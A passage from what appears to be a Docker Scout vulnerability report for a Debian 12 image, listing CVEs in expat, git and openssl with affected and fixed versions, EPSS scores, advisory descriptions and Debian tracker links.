<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libexpat before 2.6.3. xmlparse.c does not reject a negative length for XML_ParseBuffer.

---
- expat 2.6.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1080149)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/890
https://github.com/libexpat/libexpat/issues/887
https://github.com/libexpat/libexpat/commit/e5d6bf015ee531df0a8751baa618d25b2de73a7c (R_2_6_3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52425?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="high : CVE--2023--52425" src="https://img.shields.io/badge/CVE--2023--52425-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.285%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.5.0 allows a denial of service (resource consumption) because many full reparsings are required in the case of a large token for which multiple buffer fills are needed.

---
- expat 2.6.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063238)
[bookworm] - expat 2.5.0-1+deb12u2
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/789
Merge commit: https://github.com/libexpat/libexpat/commit/34b598c5f594b015c513c73f06e7ced3323edbf1

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-50602?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-1%2Bdeb12u2"><img alt="medium : CVE--2024--50602" src="https://img.shields.io/badge/CVE--2024--50602-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.130%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in libexpat before 2.6.4. There is a crash within the XML_ResumeParser function because XML_StopParser can stop/suspend an unstarted parser.

---
- expat 2.6.3-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1086134)
[bookworm] - expat 2.5.0-1+deb12u2
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/915
https://github.com/libexpat/libexpat/commit/51c7019069b862e88d94ed228659e70bddd5de09 (R_2_6_4)
https://github.com/libexpat/libexpat/commit/5fb89e7b3afa1c314b34834fe729cd063f65a4d4 (R_2_6_4)
https://github.com/libexpat/libexpat/commit/b3836ff534c7cc78128fe7b935aad3d4353814ed (R_2_6_4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28757?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-1%2Bdeb12u2"><img alt="low : CVE--2024--28757" src="https://img.shields.io/badge/CVE--2024--28757-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.885%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.6.1 allows an XML Entity Expansion attack when there is isolated use of external parsers (created via XML_ExternalEntityParserCreate).

---
- expat 2.6.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065868; unimportant)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/842
https://github.com/libexpat/libexpat/issues/839
Fixed by: https://github.com/libexpat/libexpat/commit/1d50b80cf31de87750103656f6eb693746854aa8
Tests: https://github.com/libexpat/libexpat/commit/072eca0b72373da103ce15f8f62d1d7b52695454
Expat provides API to mitigate expansion attacks, ultimately under control of the app using Expat
Cf. Billion laughs attack assessment for src:expat in CVE-2013-0340.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52426?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-1%2Bdeb12u2"><img alt="low : CVE--2023--52426" src="https://img.shields.io/badge/CVE--2023--52426-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libexpat through 2.5.0 allows recursive XML Entity Expansion if XML_DTD is undefined at compile time.

---
- expat 2.6.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1063240; unimportant)
- libxmltok <removed>
[bookworm] - libxmltok <ignored> (Minor issue, no runtime dependencies left)
https://github.com/libexpat/libexpat/pull/777
https://github.com/libexpat/libexpat/commit/0f075ec8ecb5e43f8fdca5182f8cca4703da0404
https://github.com/libexpat/libexpat/pull/777#issuecomment-1965172301
CVE is for fixing billion laughs attacks for users compiling *without* XML_DTD defined,
which is not the case for Debian.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 8" src="https://img.shields.io/badge/L-8-fce1a9"/> <!-- unspecified: 0 --><strong>git</strong> <code>1:2.39.2-1.1</code> (deb)</summary>

<small><code>pkg:deb/debian/git@1%3A2.39.2-1.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-32002?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="critical : CVE--2024--32002" src="https://img.shields.io/badge/CVE--2024--32002-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>79.594%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, repositories with submodules can be crafted in a way that exploits a bug in Git whereby it can be fooled into writing files not into the submodule's worktree but into a `.git/` directory. This allows writing a hook that will be executed while the clone operation is still running, giving the user no opportunity to inspect the code that is being executed. The problem has been patched in versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4. If symbolic link support is disabled in Git (e.g. via `git config --global core.symlinks false`), the described attack won't work. As always, it is best to avoid cloning repositories from untrusted sources.

---
- git 1:2.45.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071160)
https://github.com/git/git/security/advisories/GHSA-8h77-4q3w-gfgv
Additional useful test: https://github.com/git/git/commit/b20c10fd9b035f46e48112d2cd33d7cb740012b6
Requisite: https://github.com/git/git/commit/906fc557b70b2b2995785c9b37e212d2f86b469e
Fixed by: https://github.com/git/git/commit/97065761333fd62db1912d81b489db938d8c991d

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-32004?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="high : CVE--2024--32004" src="https://img.shields.io/badge/CVE--2024--32004-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.631%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>85th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, an attacker can prepare a local repository in such a way that, when cloned, will execute arbitrary code during the operation. The problem has been patched in versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4. As a workaround, avoid cloning repositories from untrusted sources.

---
- git 1:2.45.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071160)
https://github.com/git/git/security/advisories/GHSA-xfc6-vwr8-r389
https://github.com/git/git/commit/f4aa8c8bb11dae6e769cd930565173808cbb69c8
https://github.com/git/git/commit/7b70e9efb18c2cc3f219af399bd384c5801ba1d7
Regression: https://lore.kernel.org/git/924426.1716570031@dash.ant.isi.edu/T/#u
fcgiwrap (autopkgtest-only issue) and ikiwiki-hosting were broken
by the "detect dubious ownership" commit and fixed in >= bookworm.
The "detect dubious ownership" commit was not backported to <= bullseye.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-25652?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="high : CVE--2023--25652" src="https://img.shields.io/badge/CVE--2023--25652-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>3.184%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>87th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.30.9, 2.31.8, 2.32.7, 2.33.8, 2.34.8, 2.35.8, 2.36.6, 2.37.7, 2.38.5, 2.39.3, and 2.40.1, by feeding specially crafted input to `git apply --reject`, a path outside the working tree can be overwritten with partially controlled contents (corresponding to the rejected hunk(s) from the given patch). A fix is available in versions 2.30.9, 2.31.8, 2.32.7, 2.33.8, 2.34.8, 2.35.8, 2.36.6, 2.37.7, 2.38.5, 2.39.3, and 2.40.1. As a workaround, avoid using `git apply` with `--reject` when applying patches from an untrusted source. Use `git apply --stat` to inspect a patch before applying; avoid applying one that create a conflict where a link corresponding to the `*.rej` file exists.

---
- git 1:2.40.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034835)
https://lore.kernel.org/lkml/xmqqa5yv3n93.fsf@gitster.g/
https://github.com/git/git/commit/9db05711c98efc14f414d4c87135a34c13586e0b (v2.30.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-32465?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="high : CVE--2024--32465" src="https://img.shields.io/badge/CVE--2024--32465-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.155%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. The Git project recommends to avoid working in untrusted repositories, and instead to clone it first with `git clone --no-local` to obtain a clean copy. Git has specific protections to make that a safe operation even with an untrusted source repository, but vulnerabilities allow those protections to be bypassed. In the context of cloning local repositories owned by other users, this vulnerability has been covered in CVE-2024-32004. But there are circumstances where the fixes for CVE-2024-32004 are not enough: For example, when obtaining a `.zip` file containing a full copy of a Git repository, it should not be trusted by default to be safe, as e.g. hooks could be configured to run within the context of that repository. The problem has been patched in versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4. As a workaround, avoid using Git in repositories that have been obtained via archives from untrusted sources.

---
- git 1:2.45.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071160)
https://github.com/git/git/security/advisories/GHSA-vm9j-46j9-qvq4
Prerequsite for test: https://github.com/git/git/commit/5c5a4a1c05932378d259b1fdd9526cab971656a2
Fixed by: https://github.com/git/git/commit/7b70e9efb18c2cc3f219af399bd384c5801ba1d7

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-29007?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="high : CVE--2023--29007" src="https://img.shields.io/badge/CVE--2023--29007-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.008%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.30.9, 2.31.8, 2.32.7, 2.33.8, 2.34.8, 2.35.8, 2.36.6, 2.37.7, 2.38.5, 2.39.3, and 2.40.1, a specially crafted `.gitmodules` file with submodule URLs that are longer than 1024 characters can used to exploit a bug in `config.c::git_config_copy_or_rename_section_in_file()`. This bug can be used to inject arbitrary configuration into a user's `$GIT_DIR/config` when attempting to remove the configuration section associated with that submodule. When the attacker injects configuration values which specify executables to run (such as `core.pager`, `core.editor`, `core.sshCommand`, etc.) this can lead to a remote code execution. A fix A fix is available in versions 2.30.9, 2.31.8, 2.32.7, 2.33.8, 2.34.8, 2.35.8, 2.36.6, 2.37.7, 2.38.5, 2.39.3, and 2.40.1. As a workaround, avoid running `git submodule deinit` on untrusted repositories or without prior inspection of any submodule sections in `$GIT_DIR/config`.

---
- git 1:2.40.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034835)
https://lore.kernel.org/lkml/xmqqa5yv3n93.fsf@gitster.g/
https://github.com/git/git/commit/29198213c9163c1d552ee2bdbf78d2b09ccc98b8 (v2.30.9)
https://github.com/git/git/commit/a5bb10fd5e74101e7c07da93e7c32bbe60f6173a (v2.30.9)
https://github.com/git/git/commit/e91cfe6085c4a61372d1f800b473b73b8d225d0d (v2.30.9)
https://github.com/git/git/commit/3bb3d6bac5f2b496dfa2862dc1a84cbfa9b4449a (v2.30.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-32021?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="low : CVE--2024--32021" src="https://img.shields.io/badge/CVE--2024--32021-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, when cloning a local source repository that contains symlinks via the filesystem, Git may create hardlinks to arbitrary user-readable files on the same filesystem as the target repository in the `objects/` directory. Cloning a local repository over the filesystem may creating hardlinks to arbitrary user-owned files on the same filesystem in the target Git repository's `objects/` directory. When cloning a repository over the filesystem (without explicitly specifying the `file://` protocol or `--no-local`), the optimizations for local cloning will be used, which include attempting to hard link the object files instead of copying them. While the code includes checks against symbolic links in the source repository, which were added during the fix for CVE-2022-39253, these checks can still be raced because the hard link operation ultimately follows symlinks. If the object on the filesystem appears as a file during the check, and then a symlink during the operation, this will allow the adversary to bypass the check and create hardlinks in the destination objects directory to arbitrary, user-readable files. The problem has been patched in versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4.

---
- git 1:2.45.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071160)
https://github.com/git/git/security/advisories/GHSA-mvxm-9j2h-qjx7

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-32020?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="low : CVE--2024--32020" src="https://img.shields.io/badge/CVE--2024--32020-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.165%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a revision control system. Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, local clones may end up hardlinking files into the target repository's object database when source and target repository reside on the same disk. If the source repository is owned by a different user, then those hardlinked files may be rewritten at any point in time by the untrusted user. Cloning local repositories will cause Git to either copy or hardlink files of the source repository into the target repository. This significantly speeds up such local clones compared to doing a "proper" clone and saves both disk space and compute time. When cloning a repository located on the same disk that is owned by a different user than the current user we also end up creating such hardlinks. These files will continue to be owned and controlled by the potentially-untrusted user and can be rewritten by them at will in the future. The problem has been patched in versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4.

---
- git 1:2.45.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071160)
[bullseye] - git <ignored> (regression problem deemed too problematic)
https://github.com/git/git/security/advisories/GHSA-5rfh-556j-fhgj
https://github.com/git/git/commit/1204e1a824c34071019fe106348eaa6d88f9528d
https://github.com/git/git/commit/9e65df5eab274bf74c7b570107aacd1303a1e703
Regression: https://lore.kernel.org/git/924426.1716570031@dash.ant.isi.edu/T/#u
Bullseye discussion here: https://lists.debian.org/debian-lts/2024/05/msg00017.html
and here: https://lists.debian.org/debian-lts/2024/10/msg00015.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-25815?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u1"><img alt="low : CVE--2023--25815" src="https://img.shields.io/badge/CVE--2023--25815-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.093%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Git for Windows, the Windows port of Git, no localized messages are shipped with the installer. As a consequence, Git is expected not to localize messages at all, and skips the gettext initialization. However, due to a change in MINGW-packages, the `gettext()` function's implicit initialization no longer uses the runtime prefix but uses the hard-coded path `C:\mingw64\share\locale` to look for localized messages. And since any authenticated user has the permission to create folders in `C:\` (and since `C:\mingw64` does not typically exist), it is possible for low-privilege users to place fake messages in that location where `git.exe` will pick them up in version 2.40.1.  This vulnerability is relatively hard to exploit and requires social engineering. For example, a legitimate message at the end of a clone could be maliciously modified to ask the user to direct their web browser to a malicious website, and the user might think that the message comes from Git and is legitimate. It does require local write access by the attacker, though, which makes this attack vector less likely. Version 2.40.1 contains a patch for this issue. Some workarounds are available. Do not work on a Windows machine with shared accounts, or alternatively create a `C:\mingw64` folder and leave it empty. Users who have administrative rights may remove the permission to create folders in `C:\`.

---
- git 1:2.40.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1034835)
https://lore.kernel.org/lkml/xmqqa5yv3n93.fsf@gitster.g/
https://github.com/git/git/commit/c4137be0f5a6edf9a9044e6e43ecf4468c7a4046 (v2.30.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-52006?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u2"><img alt="low : CVE--2024--52006" src="https://img.shields.io/badge/CVE--2024--52006-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.472%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. Git defines a line-based protocol that is used to exchange information between Git and Git credential helpers. Some ecosystems (most notably, .NET and node.js) interpret single Carriage Return characters as newlines, which renders the protections against CVE-2020-5260 incomplete for credential helpers that treat Carriage Returns in this way. This issue has been addressed in commit `b01b9b8` which is included in release versions v2.48.1, v2.47.2, v2.46.3, v2.45.3, v2.44.3, v2.43.6, v2.42.4, v2.41.3, and v2.40.4. Users are advised to upgrade. Users unable to upgrade should avoid cloning from untrusted URLs, especially recursive clones.

---
- git 1:2.47.2-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1093042)
https://www.openwall.com/lists/oss-security/2025/01/14/4
Fixed by: https://github.com/git/git/commit/b01b9b81d36759cdcd07305e78765199e1bc2060 (v2.40.4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-50349?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.39.5-0%2Bdeb12u2"><img alt="low : CVE--2024--50349" src="https://img.shields.io/badge/CVE--2024--50349-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.39.5-0+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.39.5-0+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.386%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. When Git asks for credentials via a terminal prompt (i.e. without using any credential helper), it prints out the host name for which the user is expected to provide a username and/or a password. At this stage, any URL-encoded parts have been decoded already, and are printed verbatim. This allows attackers to craft URLs that contain ANSI escape sequences that the terminal interpret to confuse users e.g. into providing passwords for trusted Git hosting sites when in fact they are then sent to untrusted sites that are under the attacker's control. This issue has been patch via commits `7725b81` and `c903985` which are included in release versions v2.48.1, v2.47.2, v2.46.3, v2.45.3, v2.44.3, v2.43.6, v2.42.4, v2.41.3, and v2.40.4. Users are advised to upgrade. Users unable to upgrade should avoid cloning from untrusted URLs, especially recursive clones.

---
- git 1:2.47.2-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1093042)
https://www.openwall.com/lists/oss-security/2025/01/14/4
Fixed by: https://github.com/git/git/commit/c903985bf7e772e2d08275c1a95c8a55ab011577 (v2.40.4)
Fixed by: https://github.com/git/git/commit/7725b8100ffbbff2750ee4d61a0fcc1f53a086e8 (v2.40.4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-52005?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A2.39.5-0%2Bdeb12u3"><img alt="low : CVE--2024--52005" src="https://img.shields.io/badge/CVE--2024--52005-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:2.39.5-0+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.077%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called "sideband channel". These messages will be prefixed with "remote:" and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.

---
- git <unfixed> (unimportant)
https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329
Terminal emulators need to perform proper escaping

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-24975?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A2.39.5-0%2Bdeb12u3"><img alt="low : CVE--2022--24975" src="https://img.shields.io/badge/CVE--2022--24975-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:2.39.5-0+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.666%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The --mirror documentation for Git through 2.35.1 does not mention the availability of deleted content, aka the "GitBleed" issue. This could present a security risk if information-disclosure auditing processes rely on a clone operation without the --mirror option. Note: This has been disputed by multiple 3rd parties who believe this is an intended feature of the git binary and does not pose a security risk.

---
- git <unfixed> (unimportant)
https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/
CVE is specifically about --mirror documentation not mentioning the availability
of deleted content.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-1000021?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1%3A2.39.5-0%2Bdeb12u3"><img alt="low : CVE--2018--1000021" src="https://img.shields.io/badge/CVE--2018--1000021-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1:2.39.5-0+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.306%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GIT version 2.15.1 and earlier contains a Input Validation Error vulnerability in Client that can result in problems including messing up terminal configuration to RCE. This attack appear to be exploitable via The user must interact with a malicious git server, (or have their traffic modified in a MITM attack).

---
- git <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889680)
http://www.batterystapl.es/2018/01/security-implications-of-ansi-escape.html
Terminal emulators need to perform proper escaping

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 1" src="https://img.shields.io/badge/C-1-8b1924"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.0.11-1~deb12u2</code> (deb)</summary>

<small><code>pkg:deb/debian/openssl@3.0.11-1~deb12u2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-5535?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.15-1%7Edeb12u1"><img alt="critical : CVE--2024--5535" src="https://img.shields.io/badge/CVE--2024--5535-lightgrey?label=critical%20&labelColor=8b1924"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.15-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.15-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>4.373%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an empty supported client protocols buffer may cause a crash or memory contents to be sent to the peer.  Impact summary: A buffer overread can have a range of potential consequences such as unexpected application beahviour or a crash. In particular this issue could result in up to 255 bytes of arbitrary private data from memory being sent to the peer leading to a loss of confidentiality. However, only applications that directly call the SSL_select_next_proto function with a 0 length list of supported client protocols are affected by this issue. This would normally never be a valid scenario and is typically not under attacker control but may occur by accident in the case of a configuration or programming error in the calling application.  The OpenSSL API function SSL_select_next_proto is typically used by TLS applications that support ALPN (Application Layer Protocol Negotiation) or NPN (Next Protocol Negotiation). NPN is older, was never standardised and is deprecated in favour of ALPN. We believe that ALPN is significantly more widely deployed than NPN. The SSL_select_next_proto function accepts a list of protocols from the server and a list of protocols from the client and returns the first protocol that appears in the server list that also appears in the client list. In the case of no overlap between the two lists it returns the first item in the client list. In either case it will signal whether an overlap between the two lists was found. In the case where SSL_select_next_proto is called with a zero length client list it fails to notice this condition and returns the memory immediately following the client list pointer (and reports that there was no overlap in the lists).  This function is typically called from a server side application callback for ALPN or a client side application callback for NPN. In 